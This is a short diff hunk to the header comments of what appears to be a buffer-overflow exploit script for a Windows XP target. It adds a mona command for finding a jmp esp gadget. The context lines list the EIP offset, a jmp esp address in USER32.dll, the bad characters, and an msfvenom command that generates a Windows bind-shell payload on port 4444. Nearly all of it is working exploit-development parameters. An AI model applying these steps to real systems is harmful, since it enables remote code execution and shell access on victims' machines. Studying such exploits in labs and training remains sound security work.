@@ -9,6 +9,7 @@
 
 # EIP Location: 4116
 # Buffer starts from : 4121
+# !mona jmp -m * -r esp
 # 0x7e45b310 : jmp esp |  {PAGE_EXECUTE_READ} [USER32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\USER32.dll)
 # badchars: '\x00\x0A\x0D\x40'
 # Shellcode: msfvenom -p windows/shell_bind_tcp RHOST=192.168.1.21 LPORT=4444 -b '\x00\x0A\x0D' -f python
